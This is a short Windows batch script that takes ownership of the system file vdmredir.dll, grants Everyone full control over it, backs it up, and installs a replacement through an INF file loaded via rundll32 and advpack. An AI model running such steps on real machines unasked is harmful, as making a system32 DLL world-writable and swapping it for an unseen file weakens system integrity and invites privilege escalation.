@echo off
if not exist %systemroot%\system32\vdmredir.dll.bak (
takeown /f %systemroot%\system32\vdmredir.dll
icacls %systemroot%\system32\vdmredir.dll /grant *S-1-1-0:F /T
move /y %systemroot%\system32\vdmredir.dll  %systemroot%\system32\vdmredir.dll.bak
)
rundll32.exe advpack.dll,LaunchINFSection %CD%\vdmredir.inf

